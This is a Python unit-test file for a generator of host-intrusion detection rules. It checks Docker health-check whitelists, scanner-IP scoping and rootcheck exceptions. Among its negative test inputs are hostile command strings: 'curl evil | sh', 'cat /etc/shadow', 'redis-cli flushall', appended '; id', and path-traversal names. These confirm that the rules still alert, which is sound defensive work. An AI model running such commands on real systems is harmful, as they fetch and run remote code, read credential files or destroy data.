import json
import os
import re
import unittest
import xml.etree.ElementTree as ET

import gen_local_rules as g


def rx(command):
    return re.compile(g.pattern(command).replace(r"\z", r"\Z"), re.S)   # python spells PCRE's \z as \Z


class HealthcheckRules(unittest.TestCase):
    def test_file_is_current(self):
        self.assertEqual(open(os.path.join(g.HERE, "local_rules.xml")).read(), g.render())

    def test_xml_valid_and_ids_unique(self):
        root = ET.fromstring("<r>" + g.render().replace("<!-- Local rules -->", "") + "</r>")
        ids = [r.get("id") for r in root.iter("rule")]
        self.assertEqual(len(ids), len(set(ids)))
        self.assertIn("100001", ids)
        self.assertTrue(all(r.get("level") == "0" for r in root.iter("rule") if g.FIRST_ID <= int(r.get("id")) < g.SCANNER_RULES[0][0]))

    def test_every_entry_matches_itself_only_exactly(self):
        for e in g.load():
            cmd = e["command"].replace("<REDISPW>", "s3cret")
            self.assertTrue(rx(e["command"]).match("exec_start: " + cmd), e["container"])

    def test_lookalikes_still_alert(self):
        hc = "/bin/sh -c /usr/bin/healthcheck.sh"
        for evil in [
            "exec_start: " + hc + "; curl evil | sh",            # suffix
            "exec_start: " + hc + "\nid",                         # newline-appended command
            "exec_start: sh -c 'x # " + hc + "'",                 # contains it
            "exec_start: /bin/bash",                              # interactive shell
            "exec_start: cat /etc/shadow",
            "exec_start: redis-cli -a pw ping; id",
            "exec_start: redis-cli -a pw flushall",
            "exec_start: pg_isready -U x; id",
        ]:
            self.assertFalse(any(rx(e["command"]).match(evil) for e in g.load()), evil)

    def test_scanner_rules_are_scoped_and_lowered(self):
        root = ET.fromstring("<r>" + g.render().replace("<!-- Local rules -->", "") + "</r>")
        rules = {r.get("id"): r for r in root.iter("rule")}
        for rid, parent, _ in g.SCANNER_RULES:
            r = rules[str(rid)]
            self.assertEqual(r.get("level"), "3")                        # lowered, never 0
            self.assertEqual(r.find("srcip").text, g.SCANNER_IP)         # one address only
            self.assertEqual(r.find("if_sid").text, str(parent))

    def test_lxc_pattern_matches_real_names_only(self):
        rx = re.compile(g.LXC_DEV_PATTERN.replace(r"\z", r"\Z"))
        msg = "File '{}' present on /dev. Possible hidden file."
        for good in ["/dev/.lxc-boot-id", "/dev/.lxc/proc/keys", "/dev/.lxc/proc/key-users", "/dev/.lxc/proc/latency_stats"]:
            self.assertTrue(rx.match(msg.format(good)), good)
        for bad in ["/dev/.evil", "/dev/.lxcx/proc/keys", "/dev/.lxc/proc/keys/../../.evil", "/dev/.lxc/sys/x", "/dev/.lxc/proc/"]:
            self.assertFalse(rx.match(msg.format(bad)), bad)
        self.assertFalse(rx.match(msg.format("/dev/.lxc-boot-id") + " extra"))

    def test_hap_pattern_is_scanner_ssh_only(self):
        rx = re.compile(g.HAP_PATTERN.replace(r"\z", r"\Z"))
        line = "login failure for user karaf from {} via {}"   # what the rule sees after the pre-decoder
        self.assertTrue(rx.search(line.format("192.168.70.11", "ssh")))
        self.assertFalse(rx.search(line.format("203.0.113.5", "ssh")))
        self.assertFalse(rx.search(line.format("1192.168.70.11", "ssh")))
        self.assertFalse(rx.search(line.format("192.168.70.11", "winbox")))
        self.assertFalse(rx.search(line.format("192.168.70.111", "ssh")))

    def test_framework_trojan_pattern_matches_generic_bin_files_only(self):
        rx = re.compile(g.TROJAN_GENERIC_PATTERN.replace(r"\z", r"\Z"))
        line = "Trojaned version of file '{}' detected. Signature used: '{}' ({})."
        sig = "bash|^/bin/sh|file\\.h|proc\\.h|/dev/[^cl]|^/bin/.*sh"
        for good in ["/bin/ls", "/usr/bin/cat", "/usr/bin/chown", "/bin/env", "/usr/bin/g++"]:
            self.assertTrue(rx.match(line.format(good, sig, "Generic")), good)
        for bad in ["/usr/sbin/sshd", "/sbin/init", "/usr/bin/../../tmp/x", "/usr/bin/sub/ls", "/tmp/ls", "/usr/bin/", "/bin/ls' x '"]:
            self.assertFalse(rx.match(line.format(bad, sig, "Generic")), bad)
        self.assertFalse(rx.match(line.format("/bin/ls", sig, "Bash")))          # a named rootkit signature still alerts
        self.assertFalse(rx.match(line.format("/bin/ls", sig, "Generic") + " extra"))

    def test_framework_rules_are_scoped_to_one_agent_and_only_those_rules(self):
        root = ET.fromstring("<r>" + g.render().replace("<!-- Local rules -->", "") + "</r>")
        scoped = [r for r in root.iter("rule") if r.find("hostname") is not None or r.find("location") is not None]
        self.assertEqual([r.get("id") for r in scoped], ["100212", "100213"])   # hostname and location candidates
        for r in scoped:
            self.assertEqual(r.find("if_sid").text, "510")
            self.assertEqual(r.get("level"), "0")
            field = r.find("hostname") if r.find("hostname") is not None else r.find("location")
            # OS_Match syntax: a leading ^ anchors the start, everything else (parentheses, dots) is literal and a
            # backslash is NOT an escape. The manager shows an agent's events as "(<agent name>) any->rootcheck".
            self.assertEqual(field.text, "^(framework.gibbsgreatly.xyz) ")
            self.assertNotIn("\\", field.text)

            def osmatch(value):
                return value.startswith(field.text[1:])
            self.assertTrue(osmatch("(framework.gibbsgreatly.xyz) any"))
            self.assertTrue(osmatch("(framework.gibbsgreatly.xyz) 192.168.1.18"))
            for other in ["(apt-cacher-stack) any", "(xframework.gibbsgreatly.xyz) any", "(pve-framework.gibbsgreatly.xyz) any",
                          "framework.gibbsgreatly.xyz", "(framework.gibbsgreatly.xyz.evil) any", "x(framework.gibbsgreatly.xyz) any"]:
                self.assertFalse(osmatch(other), other)

    def test_no_xml_special_chars_in_patterns(self):
        for line in open(os.path.join(g.HERE, "local_rules.xml")):
            if 'type="pcre2"' in line:
                self.assertNotIn("&", line.split(">", 1)[1].rsplit("</field", 1)[0])

    def test_redis_password_not_in_repo(self):
        """The nextcloud Redis health check carries its password on the command line; the rule must match it with a
        wildcard and the repo must hold no literal. Checked without naming any part of the secret: no long unbroken
        alphanumeric token (a password-shaped string) may appear in the generated rules or the health-check list."""
        for name in ("local_rules.xml", "docker_healthchecks.json"):
            with open(os.path.join(g.HERE, name)) as f:
                text = f.read()
            self.assertIsNone(re.search(r"(?<![A-Za-z0-9_-])[A-Za-z0-9]{24,}(?![A-Za-z0-9_-])", text), name)
        with open(os.path.join(g.HERE, "docker_healthchecks.json")) as f:
            self.assertIn("<REDISPW>", f.read())


if __name__ == "__main__":
    unittest.main()
